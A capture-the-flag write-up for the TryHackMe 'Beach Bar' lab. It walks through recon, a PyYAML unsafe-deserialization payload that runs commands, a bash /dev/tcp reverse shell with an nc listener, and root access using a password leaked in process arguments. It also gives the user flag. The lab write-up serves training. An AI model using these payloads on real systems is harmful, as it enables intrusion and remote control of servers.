# Beach Bar — TryHackMe Writeup

**Difficulty:** Easy  
**Operating System:** Linux

---

## Reconnaissance

### Setup /etc/hosts

Configure local hostname resolution:

![[Machines/TryHackMe/BearchBar/Screenshots/etchosts.png]]
### Nmap Scan — Port Enumeration

Perform comprehensive port scanning to identify active services:

`nmap -p- bar.lab -sC -sV --min-rate 500 -o ports.txt`

![[Machines/TryHackMe/BearchBar/Screenshots/nmap.png]]

- SSH on standard port 22 (OpenSSH 9.6p1)
- Web server on port 80 (Gunicorn)
- Only 2 open ports (small attack surface)

---

## Web Application Analysis

### Initial HTTP Reconnaissance

Access the web application on port 80:

![[Machines/TryHackMe/BearchBar/Screenshots/application.png]]


Accessing `http://bar.lab/` redirects to `/login`.

View source exposure valid credentials for demo DJ login

![[Machines/TryHackMe/BearchBar/Screenshots/viewsource.png]]


---

## Post-Authentication Exploration

### Dashboard Access

Upon successful login, user is presented with DJ booth management dashboard.

![[userinterface.png]]

**Dashboard Features:**

- **Import:** Load playlist from YAML file
- **Export:** Download current playlist as YAML

### Playlist Import/Export Analysis

Import interface:

![[import.png]]

Then export the current playlist to understand file format:

![[playlist.png]]


---

## Vulnerability Identification

### YAML Deserialization Analysis

**Hypothesis:** The application parses uploaded YAML files. If using unsafe deserialization, remote code execution is possible.

**PyYAML Vulnerability Background:**

Unsafe PyYAML loaders can instantiate arbitrary Python objects and invoke Python callables through YAML-specific tags such as `!!python/object/apply`.

**Risk:** An attacker can craft YAML that executes Python code during parsing.

### Testing Unsafe Deserialization

![[testplaylist.png]]


![[testoutput.png]]

### Uploading Malicious YAML

Create a test YAML file with Python object deserialization:

![[idyaml.png]]


![[testid.png]]

**Confirmation:** Code execution achieved as user `bartender`.

**Attack Mechanism:**

The application was vulnerable to **unsafe YAML deserialization**. The YAML parser allowed Python-specific tags such as `!!python/object/apply`, which can invoke Python callables during deserialization.

In the following payload:

```
title: !!python/object/apply:subprocess.check_output [["id"]]
```

PyYAML resolves `subprocess.check_output` and invokes it with `["id"]` as its argument. This causes the `id` command to execute **during the deserialization process**, rather than being treated as ordinary YAML data.

The vulnerability therefore occurs because **attacker-controlled YAML is parsed using an unsafe loader capable of constructing and invoking Python objects/functions**. This can lead to arbitrary command execution in the context of the application process.


---

## Exploitation

### Remote Code Execution via YAML

### Reverse Shell Payload

Craft a reverse shell payload for interactive access:

The `id` command can be replaced with a reverse shell for interactive access:

```
"bash", "-c", "bash -i >& /dev/tcp/*ip*/*port* 0>&1"
```

![[revshellcode.png]]

**Setup listener on attack machine:**

```bash
nc -lnvp 9999
```

**Upload malicious YAML** → Receive reverse shell connection.

---

## Initial Access

### Reverse Shell Connection

**Shell received:**

![[reverseshell.png]]

**Shell User:** `bartender` 
**Current Directory:** `/opt/beach-bar/webapp`

### User Flag Retrieval

Navigate to home directory and capture user flag:

![[Machines/TryHackMe/BearchBar/Screenshots/userflag.png]]


---

## Privilege Escalation

### Enumeration for PrivEsc Vectors

Examine running processes to identify potential escalation paths:

```bash
ps aux | grep "root"
```

**Key Process Identified:**

![[leakedpass.png]]

**Analysis:**

- Jukebox application running as root
- Parameter `--stream-pass` contains a suspicious password/token
- Parameter visible to all users (process argument)
- Sensitive credential/token disclosure via process arguments

**Assumption:** This password is reused for the `root` user account.

### Privilege escalation to root and capture the flag

Attempt to switch to root user using extracted credentials:

```bash
su root
# Password: [password extracted from process arguments]
```


![[Machines/TryHackMe/BearchBar/Screenshots/rootflag.png]]

Pwned

---

## Attack Chain Summary

| Stage                | Method                  | Result                           |
| -------------------- | ----------------------- | -------------------------------- |
| Reconnaissance       | Nmap Scan               | SSH and Gunicorn identified      |
| Enumeration          | HTTP Analysis           | /login endpoint discovered       |
| Authentication       | Default Credentials     | DJ booth access granted          |
| Analysis             | Playlist Export         | YAML file format understood      |
| Vulnerability        | YAML Parsing            | Unsafe deserialization confirmed |
| Exploitation         | Python Object Injection | RCE as bartender user achieved   |
| Reverse Shell        | Payload Upload          | Interactive shell obtained       |
| User Flag            | Home Directory Access   | THM{y4m} captured                |
| Enumeration          | Process Analysis        | Root password found in cmdline   |
| Privilege Escalation | su Command              | Root access obtained             |
| Root Flag            | Directory Listing       | Root flag captured               |


---

> Made by [Noname](https://github.com/NonamesecX) | For educational purposes only